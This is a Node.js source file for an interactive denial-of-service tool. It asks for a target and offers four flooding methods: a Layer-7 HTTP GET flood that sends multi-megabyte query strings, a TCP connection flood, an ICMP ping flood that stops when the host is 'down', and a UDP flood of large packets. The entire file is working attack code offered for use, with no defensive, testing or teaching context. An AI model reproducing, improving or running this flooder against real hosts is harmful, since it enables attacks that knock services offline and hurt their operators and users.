const request = require('request');
const net = require('net');
const ICMP = require('ping');
const dgram = require('dgram');
const readline = require('readline').createInterface({input: process.stdin,output: process.stdout});

readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method: ', (method_input) => {
    if (method_input == 'GET') {
        readline.question('URL: ', (url) => {
            readline.question('Packet Size (MB): ', (size) => {
                readline.question('Time (seconds): ', (time) => {
                    readline.question('Multi requests: ', (requests) => {
                        const send_packets = setInterval(() => {
                            for (let i = 0; i < requests; i++) {
                                request({ uri: url, qs: { data: '0'.repeat(size * 1024 * 1024) }, json: true });
                            }
                        }, 1000)
                        setTimeout(() => {
                            clearInterval(send_packets)
                        }, time * 1000)
                    });
                });
            });
        });
    } else if (method_input == 'CNC') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Time to build (seconds): ', (build_time) => {
                    const connector = setInterval(() => {
                        net.createConnection({ host, port });
                    }, 10);
                    setTimeout(() => {
                        clearInterval(connector)
                    }, build_time * 1000)
                });
            });
        });
    } else if (method_input == 'ICMP') {
        readline.question('Host: ', (host) => {
            readline.question('Multi Ping: ', (multi) => {
                readline.question('Time (seconds): ', (time) => {
                    const icmp_sender = setInterval(() => {
                        for (let i = 0; i < multi; i++) {
                            ICMP.sys.probe(host, function (isAlive) {
                                if (!isAlive) {
                                    console.log('Host is down.');
                                    process.exit(0)
                                }
                            });
                        }
                    }, 0)
                    setTimeout(() => {
                        clearInterval(icmp_sender)
                    }, time * 1000)
                });
            });
        });
    } else if (method_input == 'UDP') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Packet Size (MB): ', (size) => {

                    readline.question('Time: ', (time) => {
                        const udp_sender = setInterval(() => {
                            const x = dgram.createSocket('udp4');
                            const y = Buffer.alloc(size / 2 * 1024 * 1024, '01');
                            x.send(y, 0, y.length, port, host, (error) => {
                                if (error) {
                                    console.error(error);
                                }
                                x.close();
                            });
                        }, 0)
                        setTimeout(() => {
                            clearInterval(udp_sender)
                        }, time * 1000)
                    });
                });

        });
    });
    } else {
        console.log('Invalid method!')
    }
});
